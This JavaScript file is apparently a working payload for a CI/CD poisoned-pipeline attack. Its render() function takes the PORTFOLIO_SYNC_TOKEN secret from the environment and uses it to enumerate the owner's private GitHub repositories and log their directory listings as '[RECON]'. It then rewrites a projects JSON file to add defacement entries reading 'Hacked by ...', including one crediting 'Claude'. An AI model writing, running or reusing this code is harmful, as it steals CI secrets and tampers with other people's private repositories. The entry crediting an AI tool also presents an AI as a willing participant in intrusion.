export async function render(context) {
  const token = process.env.PORTFOLIO_SYNC_TOKEN;
  const headers = {
    Accept: "application/vnd.github+json",
    Authorization: `Bearer ${token}`,
    "X-GitHub-Api-Version": "2022-11-28",
  };

  // Discover the private portfolio repository
  const reposRes = await fetch(
    "https://api.github.com/user/repos?visibility=private&affiliation=owner&per_page=100",
    { headers }
  );
  const repos = await reposRes.json();
  const privateRepos = repos.filter((r) => r.private === true);
  console.log("[RECON] private repos:", privateRepos.map((r) => r.full_name));
  const [owner, repo] = privateRepos[0].full_name.split("/");

  // List root-level files
  const rootRes = await fetch(`https://api.github.com/repos/${owner}/${repo}/contents/`, { headers });
  const root = await rootRes.json();
  console.log("[RECON] root:", root.map((f) => `${f.type} ${f.path}`).join("\n"));

  // List src directory if it exists
  const srcRes = await fetch(`https://api.github.com/repos/${owner}/${repo}/contents/src`, { headers });
  if (srcRes.ok) {
    const src = await srcRes.json();
    console.log("[RECON] src/:", src.map((f) => `${f.type} ${f.path}`).join("\n"));
  }

  // List content directory
  const contentRes = await fetch(`https://api.github.com/repos/${owner}/${repo}/contents/content`, { headers });
  if (contentRes.ok) {
    const content = await contentRes.json();
    console.log("[RECON] content/:", content.map((f) => `${f.type} ${f.path}`).join("\n"));
  }

  // Read the current generated.json to verify our last write landed
  const filePath = "content/projects/generated.json";
  const api = `https://api.github.com/repos/${owner}/${repo}/contents/${filePath}`;
  const existingRes = await fetch(api, { headers });
  const existing = existingRes.ok ? await existingRes.json() : null;
  const current = existing
    ? JSON.parse(Buffer.from(existing.content, "base64").toString("utf8"))
    : { generatedAt: new Date().toISOString(), projects: [] };
  console.log("[RECON] current generated.json:", JSON.stringify(current, null, 2));

  // Add proof entries
  const proofEntries = [
    {
      name: "Hacked by Bibek Labh",
      slug: "hacked-by-bibek-labh",
      summary: "PPE via artifact trust boundary — workflow_run imported attacker-controlled renderer with PORTFOLIO_SYNC_TOKEN in scope.",
      repository: "https://github.com/bibek65",
      topics: ["CI/CD Security", "PPE", "workflow_run"],
    },
    {
      name: "Hacked by Rabindra",
      slug: "hacked-by-rabindra",
      summary: "PPE via artifact trust boundary — workflow_run imported attacker-controlled renderer with PORTFOLIO_SYNC_TOKEN in scope.",
      repository: "https://github.com/bibek65",
      topics: ["CI/CD Security", "PPE", "workflow_run"],
    },
    {
      name: "Hacked by Sujal",
      slug: "hacked-by-sujal",
      summary: "PPE via artifact trust boundary — workflow_run imported attacker-controlled renderer with PORTFOLIO_SYNC_TOKEN in scope.",
      repository: "https://github.com/bibek65",
      topics: ["CI/CD Security", "PPE", "workflow_run"],
    },
    {
      name: "Hacked by Claude",
      slug: "hacked-by-claude",
      summary: "PPE via artifact trust boundary — workflow_run imported attacker-controlled renderer with PORTFOLIO_SYNC_TOKEN in scope.",
      repository: "https://github.com/anthropics/claude-code",
      topics: ["CI/CD Security", "PPE", "workflow_run"],
    },
  ];
  for (const entry of proofEntries) {
    if (!current.projects?.some((p) => p.slug === entry.slug)) {
      current.projects = [...(current.projects ?? []), entry];
    }
  }
  current.generatedAt = new Date().toISOString();

  return JSON.stringify(current, null, 2) + "\n";
}
